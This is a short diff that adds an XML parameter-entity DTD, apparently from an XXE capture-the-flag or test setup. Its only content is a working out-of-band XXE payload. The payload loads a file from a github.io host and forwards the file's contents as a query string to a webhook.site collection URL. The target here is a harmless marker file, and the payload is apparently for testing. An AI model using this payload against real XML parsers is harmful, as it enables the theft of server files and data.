@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "https://denvot.github.io/xxe-ctf/marker.txt">
+<!ENTITY % make "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/a2a34c05-9d07-4a97-bb6b-9fd47ab6ce42/remote-ok?data=%data;'>">
+%make;
+%send;
